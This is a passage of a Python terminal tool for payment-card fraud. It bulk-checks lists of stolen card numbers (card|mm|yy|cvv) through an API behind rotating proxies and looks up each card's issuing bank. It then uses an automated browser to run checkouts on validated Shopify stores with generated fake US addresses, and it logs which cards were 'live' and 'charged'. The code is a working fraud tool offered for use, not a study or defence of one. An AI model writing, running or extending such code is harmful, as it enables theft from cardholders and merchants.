        proxy = pool.next() if pool else None
        r = requests.get(f"https://{domain}/products.json?limit=20", timeout=12,
                         headers={"User-Agent": "Mozilla/5.0"}, proxies=proxy_dict(proxy))
        if r.status_code != 200: result["error"] = f"HTTP {r.status_code}"; return result
        products = r.json().get("products") or []
        if not products: result["error"] = "no products"; return result
        result["shopify"] = True; cats = set()
        for p in products[:10]:
            if p.get("product_type"): cats.add(p["product_type"].strip())
            for t in (p.get("tags") or [])[:3]:
                if t and len(t) < 30: cats.add(t.strip())
        result["categories"] = sorted(cats)[:15]
    except Exception as e: result["error"] = str(e)[:80]
    return result

def load_cached_stores():
    if not os.path.isfile(STORE_CACHE): return []
    try:
        with open(STORE_CACHE, "r", encoding="utf-8") as f: return json.load(f)
    except Exception: return []

def save_store_cache(stores):
    with open(STORE_CACHE, "w", encoding="utf-8") as f: json.dump(stores, f, indent=2, ensure_ascii=False)

def validate_all_stores(pool):
    banner(); print("  " + CYAN + f"validating {len(SHOPIFY_DOMAINS)} domains..." + R); print()
    live = []; total = len(SHOPIFY_DOMAINS); done = 0
    status_line("  " + progress_bar(0, total))
    with ThreadPoolExecutor(max_workers=12) as tp:
        futures = {tp.submit(_probe_store, d, pool): d for d in SHOPIFY_DOMAINS}
        for fut in as_completed(futures):
            res = fut.result(); done += 1; clear_status()
            if res["shopify"]:
                live.append(res); cats = ", ".join(res["categories"][:3]) or "—"
                print(f"  {GREEN}✓{R}  {WHITE}{res['domain']:<32}{R}  {DIM}{cats}{R}")
            else: print(f"  {RED}✗{R}  {DIM}{res['domain']:<32}  {res.get('error','')}{R}")
            status_line("  " + progress_bar(done, total))
    clear_status(); print(); print("  " + GREEN + f"{len(live)} live shopify stores validated" + R)
    save_store_cache(live); return live

def get_categories(stores):
    cats = set()
    for s in stores:
        for c in s.get("categories", []):
            if c and 2 < len(c) < 30: cats.add(c.strip())
    return sorted(cats)

# =========================================================
#  STORAGE
# =========================================================
class Storage:
    def __init__(self, folder):
        self.folder = folder; os.makedirs(folder, exist_ok=True)
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.hits_path = os.path.join(folder, f"hits_{stamp}.txt")
        self.full_path = os.path.join(folder, f"full_{stamp}.txt")
        self.checkout_path = os.path.join(folder, f"checkout_{stamp}.txt")
        self.charged_path = os.path.join(folder, f"charged_{stamp}.txt")
        self._lock = threading.Lock()
        for p in (self.hits_path, self.full_path, self.checkout_path, self.charged_path):
            with open(p, "a", encoding="utf-8") as f: f.write(f"# run {datetime.now().isoformat(timespec='seconds')}\n")
    def write(self, cc, api_res, bin_res=None, co_res=None):
        with self._lock:
            with open(self.hits_path, "a", encoding="utf-8") as f: f.write(cc + "\n")
            b = bin_res or {}
            line = f"{cc}\t{api_res.get('status','')}\t{b.get('scheme','')}\t{b.get('bank','')}\t{b.get('country','')}\t{b.get('country_code','')}\n"
            with open(self.full_path, "a", encoding="utf-8") as f: f.write(line)
            if co_res:
                with open(self.checkout_path, "a", encoding="utf-8") as f:
                    f.write(f"{cc}\t{co_res.get('status')}\t{co_res.get('message','')}\t{co_res.get('url','')}\n")
                if co_res.get("status") == "charged":
                    with open(self.charged_path, "a", encoding="utf-8") as f:
                        f.write(f"{cc}\t{co_res.get('url','')}\n")

# =========================================================
#  RENDER
# =========================================================
def country_str(b):
    name = b.get("country") or ""; emoji = b.get("country_emoji") or ""
    return f"{name}  {emoji}".strip() if name else ""

def _bin_bits(b):
    if not b or b.get("error"): return ""
    parts = []
    if b.get("bank"): parts.append(b["bank"])
    cs = country_str(b)
    if cs: parts.append(cs)
    if b.get("type"): parts.append(b["type"])
    if b.get("prepaid"): parts.append("Prepaid")
    return "  ·  ".join(parts)

def render_compact(cc, api_res, bin_res=None, co_res=None):
    st = str(api_res.get("status", "unknown")).lower()
    tag = f"{STATUS_COLOR.get(st, YELLOW)}{st.upper():<5}{R}"
    extras = []
    if api_res.get("network"): extras.append(str(api_res["network"]))
    bb = _bin_bits(bin_res or {})
    if bb: extras.append(bb)
    extra = ("  " + DIM + "  ·  ".join(extras) + R) if extras else ""
    co = ""
    if co_res:
        cs = co_res.get("status", "unknown").lower()
        co = f"  {STATUS_COLOR.get(cs, YELLOW)}⌁ {cs}{R}"
        if co_res.get("message"): co += f"  {DIM}{co_res['message'][:50]}{R}"
    print(f"  {tag}  {WHITE}{cc}{R}{extra}{co}")

# =========================================================
#  FLOWS
# =========================================================
def run_single():
    pool = build_pool()
    while True:
        cc = input("  " + CYAN + "cc ▸ " + R).strip()
        if not cc: continue
        if not CC_RE.match(cc): print("  " + RED + "bad format — card|mm|yy|cvv"); continue
        with Spinner("api"): api_res = api_check(cc, pool=pool)
        with Spinner("bin"): bin_res = lookup_bin(extract_bin(cc), pool=pool)
        render_block(cc, api_res, bin_res)
        if input("  " + YELLOW + "another? (y/n) ▸ " + R).strip().lower() != "y": break

def run_bulk():
    pool = build_pool(); src = choose_file(ext=".txt", prompt_label="card list")
    if not src: return
    ccs_raw = []
    with open(src, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            s = ln.strip()
            if s and not s.startswith("#"): ccs_raw.append(s)
    seen = set(); ccs = [c for c in ccs_raw if not (c in seen or seen.add(c))]
    if not ccs: print("  " + RED + "empty"); return
    raw_w = input("  " + CYAN + "threads [8] ▸ " + R).strip()
    try: workers = max(1, min(64, int(raw_w))) if raw_w else 8
    except ValueError: workers = 8
    store = Storage(ensure_storage()); counts = {"live": 0, "dead": 0, "error": 0, "other": 0}; total = len(ccs); t0 = time.time()
    def worker(cc):
        api_res = api_check(cc, pool=pool); bin_res = lookup_bin(extract_bin(cc), pool=pool)
        return cc, api_res, bin_res
    with ThreadPoolExecutor(max_workers=workers) as tp:
        futures = {tp.submit(worker, cc): cc for cc in ccs}; done_n = 0
        status_line("  " + progress_bar(0, total))
        for fut in as_completed(futures):
            cc, api_res, bin_res = fut.result(); done_n += 1
            st = str(api_res.get("status", "unknown")).lower()
            counts[st if st in counts else "other"] += 1
            clear_status(); render_compact(cc, api_res, bin_res)
            if st == "live": store.write(cc, api_res, bin_res)
            status_line("  " + progress_bar(done_n, total))
        clear_status()
    elapsed = time.time() - t0
    print(); boxed([f"  {WHITE}DONE{R}", f"  Live   : {GREEN}{counts['live']}{R}",
                    f"  Dead   : {RED}{counts['dead']}{R}", f"  Error  : {YELLOW}{counts['error']}{R}",
                    f"  Time   : {WHITE}{elapsed:.1f}s{R}", f"  Hits   : {DIM}{store.hits_path}{R}"])

def run_shopify_browser():
    engine = detect_browser_engine()
    if not engine:
        banner(); boxed([f"  {RED}browser engine not found{R}", f"  {DIM}run:{R}",
                         f"  {WHITE}pip install termux-playwright{R}", f"  {WHITE}python -m termux_playwright install{R}"], width=68); return
    if engine == "playwright" and not CHROMIUM_PATH:
        print(); boxed([f"  {YELLOW}chromium binary not found{R}", f"  {DIM}run: pkg install chromium{R}",
                        f"  {DIM}or export CHROMIUM_PATH=/path/to/chrome{R}"]); return
    pool = build_pool(); stores = load_cached_stores()
    if not stores:
        print(); boxed([f"  {YELLOW}no store cache — validating now{R}", f"  {DIM}this takes ~3-5 min for {len(SHOPIFY_DOMAINS)} domains{R}"])
        yn = input("  " + YELLOW + "run? (y/n) ▸ " + R).strip().lower()
        if yn != "y": return
        stores = validate_all_stores(pool)
        if not stores: print("  " + RED + "no live stores"); return
    cats = get_categories(stores)
    if not cats: print("  " + RED + "no categories"); return
    print(); print(CYAN + "  ┌─ categories " + "─" * 50 + "┐" + R)
    for i, c in enumerate(cats, 1): print(f"  {WHITE}[{i:>2}]{R}  {c}")
    print(f"  {WHITE}[ 0]{R}  all"); print(f"  {WHITE}[ r]{R}  re-validate stores"); print(f"  {WHITE}[ q]{R}  cancel")
    print(CYAN + "  └" + "─" * 61 + "┘" + R)
    sel = input("  " + YELLOW + "select ▸ " + R).strip()
    if sel.lower() == "q": return
    if sel.lower() == "r":
        stores = validate_all_stores(pool); save_store_cache(stores); return
    if sel == "0" or sel == "": chosen = cats
    else:
        chosen = []
        for part in sel.split(","):
            try:
                i = int(part.strip()) - 1
                if 0 <= i < len(cats): chosen.append(cats[i])
            except ValueError: pass
    if not chosen: return
    filtered = [s for s in stores if any(c in s.get("categories", []) for c in chosen)]
    if not filtered: print("  " + RED + "no stores match"); return
    src = choose_file(ext=".txt", prompt_label="card list")
    if not src: return
    with open(src, "r", encoding="utf-8", errors="ignore") as f:
        ccs = [ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]
    seen = set(); ccs = [c for c in ccs if not (c in seen or seen.add(c))]
    if not ccs: print("  " + RED + "empty"); return
    addr = CFG.get("address") or generate_address()
    if not addr.get("email"): addr = generate_address(); CFG["address"] = addr; save_config(CFG)
    print(); boxed([f"  {WHITE}engine:{R} {engine}", f"  {WHITE}chromium:{R} {CHROMIUM_PATH or 'auto'}",
                    f"  {WHITE}headless:{R} {CFG.get('headless', True)}", f"  {WHITE}proxies:{R} {len(pool) if pool else 0}",
                    f"  {WHITE}stores:{R} {len(filtered)}  ·  cards: {len(ccs)}",
                    f"  {WHITE}address:{R} {addr['first_name']} {addr['last_name']}, {addr['city']}, {addr['province_code']}"], width=70)
    print(); boxed([f"  {YELLOW}opens a real browser per live card{R}", f"  {DIM}each checkout takes 15-40 seconds{R}"]); print()
    store_out = Storage(ensure_storage()); hits = charged = declined = errors = 0; t0 = time.time(); total = len(ccs)
    for idx, cc in enumerate(ccs, 1):
        print(f"\n  {DIM}[{idx}/{total}]{R}  {WHITE}{cc}{R}")
        with Spinner("api"): api_res = api_check(cc, pool=pool)
        if api_res.get("status") != "live":
            st = api_res.get("status", "?"); print(f"  {STATUS_COLOR.get(st, YELLOW)}{st.upper()}{R}  skipping browser"); continue
        hits += 1
        with Spinner("bin"): bin_res = lookup_bin(extract_bin(cc), pool=pool)
        print("  " + GREEN + "LIVE" + R + "  → launching browser...")
        domain_info = random.choice(filtered); domain = domain_info["domain"]
        print(f"  {DIM}store:{R} {WHITE}{domain}{R}")
        co_res = browser_checkout(domain, cc, addr, pool=pool)
        clear_status(); render_compact(cc, api_res, bin_res, co_res)
        if co_res.get("product"): print(f"  {DIM}↳ {co_res['product'][:60]}  ${co_res.get('price','')}{R}")
        if co_res.get("url"): print(f"  {CYAN}{co_res['url'][:100]}{R}")
        st = co_res.get("status", "unknown")
        if st == "charged": charged += 1
        elif st == "declined": declined += 1
        else: errors += 1
        store_out.write(cc, api_res, bin_res, co_res)
    elapsed = time.time() - t0
    print(); boxed([f"  {WHITE}BROWSER CHECKOUT DONE{R}", f"  Live checked  : {GREEN}{hits}{R}",
                    f"  Charged       : {GREEN}{charged}{R}", f"  Declined      : {RED}{declined}{R}",
                    f"  Errors/Other  : {YELLOW}{errors}{R}", f"  Elapsed       : {WHITE}{elapsed:.1f}s{R}",
                    f"  Charged file  : {DIM}{store_out.charged_path}{R}"], width=70)

# =========================================================
#  BROWSER DETECTION
# =========================================================
IS_TERMUX = "com.termux" in os.environ.get("PREFIX", "") or os.path.isdir("/data/data/com.termux")

def find_chromium():
    env_path = os.environ.get("CHROMIUM_PATH")
    if env_path and os.path.isfile(env_path): return env_path
    for c in ["/data/data/com.termux/files/usr/lib/chromium/chrome",
              "/data/data/com.termux/files/usr/bin/chromium-browser",
              "/data/data/com.termux/files/usr/bin/chromium",
              "/usr/bin/chromium-browser", "/usr/bin/chromium",
              "/usr/bin/google-chrome", "/usr/bin/google-chrome-stable"]:
        if os.path.isfile(c): return c
    for name in ("chromium-browser", "chromium", "google-chrome"):
        try:
            path = subprocess.check_output(["which", name], stderr=subprocess.DEVNULL).decode().strip()
            if path: return path
        except Exception: pass
    return None

CHROMIUM_PATH = find_chromium()
_BROWSER_ENGINE = None

def detect_browser_engine():
    global _BROWSER_ENGINE
    if _BROWSER_ENGINE is not None: return _BROWSER_ENGINE
    try: import playwright; _BROWSER_ENGINE = "playwright"; return _BROWSER_ENGINE
    except ImportError: pass
    try: import cdriv; _BROWSER_ENGINE = "cdriv"; return _BROWSER_ENGINE
    except ImportError: pass
    return None

# =========================================================
#  PROXY MENU
# =========================================================
def proxy_menu():
    while True:
        banner(); proxies = CFG.get("proxies") or []
        boxed([f"  {WHITE}[1]{R}  Add proxy (wizard)", f"  {WHITE}[2]{R}  Import from .txt",
               f"  {WHITE}[3]{R}  List ({len(proxies)})", f"  {WHITE}[4]{R}  Remove one",
               f"  {WHITE}[5]{R}  Clear all", f"  {WHITE}[0]{R}  Back"])
        c = input("  " + YELLOW + "select ▸ " + R).strip()
        if c == "1":
            banner(); host = input("  " + CYAN + "host ▸ " + R).strip()
            if not host: continue
            port = input("  " + CYAN + "port ▸ " + R).strip()
            user = input("  " + CYAN + "user ▸ " + R).strip()
            pwd = input("  " + CYAN + "pass ▸ " + R).strip()
            scheme = input("  " + CYAN + "scheme [http/socks5] ▸ " + R).strip() or "http"
            entry = f"{scheme}://{user}:{pwd}@{host}:{port}" if user and pwd else f"{scheme}://{host}:{port}"
            if input("  " + YELLOW + "confirm? (y/n) ▸ " + R).strip().lower() == "y":
                CFG.setdefault("proxies", []).append(entry); save_config(CFG)
                print("  " + GREEN + "saved" + R); time.sleep(0.6)
        elif c == "2":
            p = choose_file(ext=".txt", prompt_label="proxy list")
            if not p: continue
            n = 0
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                for ln in f:
                    s = ln.strip()
                    if s and not s.startswith("#"): CFG.setdefault("proxies", []).append(s); n += 1
            save_config(CFG); print("  " + GREEN + f"imported {n}" + R); time.sleep(0.8)
        elif c == "3":
            for i, p in enumerate(proxies, 1): print(f"  {WHITE}{i:>3}.{R} {p}")
            if not proxies: print("  " + DIM + "(none)" + R)
            input("\n  " + DIM + "enter" + R)
        elif c == "4":
            if not proxies: continue
            for i, p in enumerate(proxies, 1): print(f"  {WHITE}{i:>3}.{R} {p}")
            idx = input("  " + CYAN + "index ▸ " + R).strip()
            try:
                i = int(idx) - 1
                if 0 <= i < len(proxies):
                    proxies.pop(i); save_config(CFG); print("  " + GREEN + "removed" + R); time.sleep(0.5)
            except ValueError: pass
        elif c == "5":
            if input("  " + RED + "clear ALL? (y/n) ▸ " + R).strip().lower() == "y":
                CFG["proxies"] = []; save_config(CFG); print("  " + GREEN + "cleared" + R); time.sleep(0.5)
        elif c in ("0", ""): return

# =========================================================
#  SETTINGS
# =========================================================
def address_menu():
    fields = [("first_name", "First name"), ("last_name", "Last name"),
              ("address1", "Address line 1"), ("address2", "Address line 2"),
              ("city", "City"), ("province_code", "State/Province"),
              ("country_code", "Country"), ("zip", "ZIP"), ("phone", "Phone"), ("email", "Email")]
    while True:
        banner(); addr = CFG.get("address", {}); lines = []
        for i, (k, lbl) in enumerate(fields, 1):
            v = addr.get(k, ""); disp = v if v else DIM + "(empty)" + R
            lines.append(f"  {WHITE}[{i:>2}]{R}  {lbl:<22} {disp}")
        lines.append(f"  {WHITE}[ 0]{R}  Back"); boxed(lines, width=68)
        c = input("  " + YELLOW + "field ▸ " + R).strip()
        if c in ("0", ""): return
        try:
            i = int(c) - 1
            if 0 <= i < len(fields):
                k, lbl = fields[i]; v = input(f"  {CYAN}{lbl} ▸ " + R).strip()
                CFG.setdefault("address", {})[k] = v; save_config(CFG)
        except ValueError: pass

def settings_menu():
    global _BROWSER_ENGINE
    while True:
        banner(); addr = CFG.get("address", {}); filled = sum(1 for v in addr.values() if v)
        engine = detect_browser_engine() or "none"
        boxed([f"  {WHITE}[1]{R}  Storage folder     {DIM}{CFG.get('storage_folder','')[:30]}{R}",
               f"  {WHITE}[2]{R}  Address            {DIM}{filled}/10 fields{R}",
               f"  {WHITE}[3]{R}  Regenerate address {DIM}(random US){R}",
               f"  {WHITE}[4]{R}  Headless           {DIM}{CFG.get('headless', True)}{R}",
               f"  {WHITE}[5]{R}  Timeout (ms)       {DIM}{CFG.get('timeout_ms', 45000)}{R}",
               f"  {WHITE}[6]{R}  Browser engine     {DIM}{engine}{R}",
               f"  {WHITE}[7]{R}  Re-detect engine", f"  {WHITE}[0]{R}  Back"], width=66)
        c = input("  " + YELLOW + "select ▸ " + R).strip()
        if c == "1":
            p = choose_dir("storage folder")
            if p: CFG["storage_folder"] = p; save_config(CFG)
        elif c == "2": address_menu()
        elif c == "3":
            a = generate_address(); CFG["address"] = a; save_config(CFG)
            boxed([f"  {WHITE}{a['first_name']} {a['last_name']}{R}", f"  {WHITE}{a['address1']}{R}",
                   f"  {WHITE}{a['city']}, {a['province_code']} {a['zip']}{R}",
                   f"  {WHITE}{a['country_code']}  ·  {a['phone']}{R}", f"  {WHITE}{a['email']}{R}"], width=66)
            print("  " + GREEN + "saved" + R); time.sleep(1.5)
        elif c == "4":
            CFG["headless"] = not CFG.get("headless", True); save_config(CFG)
            print(f"  {GREEN}headless = {CFG['headless']}{R}"); time.sleep(0.6)
        elif c == "5":
            try:
                t = int(input("  " + CYAN + "timeout ms ▸ " + R).strip())
                CFG["timeout_ms"] = max(10000, min(120000, t)); save_config(CFG)
            except ValueError: pass
        elif c == "6":
            _BROWSER_ENGINE = None; detected = detect_browser_engine()
            print(f"  {GREEN}detected: {detected or 'none'}{R}"); time.sleep(1)
        elif c == "7":
            _BROWSER_ENGINE = None; print(f"  {GREEN}re-detecting...{R}"); time.sleep(0.8)
        elif c in ("0", ""): return

# =========================================================
#  MENU + MAIN
# =========================================================
def menu():
    print(); engine = detect_browser_engine() or "none"
    boxed([f"  {WHITE}[1]{R}  Single API check", f"  {WHITE}[2]{R}  Bulk API check",
           f"  {WHITE}[3]{R}  {GREEN}Shopify browser checkout{R}  {DIM}({engine}){R}",
           f"  {WHITE}[4]{R}  Proxy configuration", f"  {WHITE}[5]{R}  Settings",
           f"  {WHITE}[0]{R}  Exit"], width=66)
    print(); return input("  " + YELLOW + "select ▸ " + R).strip()

def main():
    if not auth_gate(): return
    banner(); type_out("  initializing...", delay=0.02, color=DIM)
    engine = detect_browser_engine()
    type_out(f"  browser engine: {engine or 'none'}", delay=0.015, color=DIM if not engine else GREEN)
    type_out(f"  chromium: {CHROMIUM_PATH or 'not found'}", delay=0.015, color=DIM if not CHROMIUM_PATH else GREEN)
    time.sleep(0.4); type_out("  ready.", delay=0.02, color=GREEN)
    while True:
        c = menu()
        if c == "1": banner(); run_single()
        elif c == "2": banner(); run_bulk(); input("\n  " + DIM + "enter" + R)
        elif c == "3": banner(); run_shopify_browser(); input("\n  " + DIM + "enter" + R)
        elif c == "4": proxy_menu()
        elif c == "5": settings_menu()
        elif c in ("0", "q", "exit"):
            print(); type_out("  goodbye...", delay=0.03, color=RED); return
        else: print("  " + RED + "invalid" + R); time.sleep(0.4)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt:
        show_cursor(); print("\n" + RED + "  goodbye..." + R)
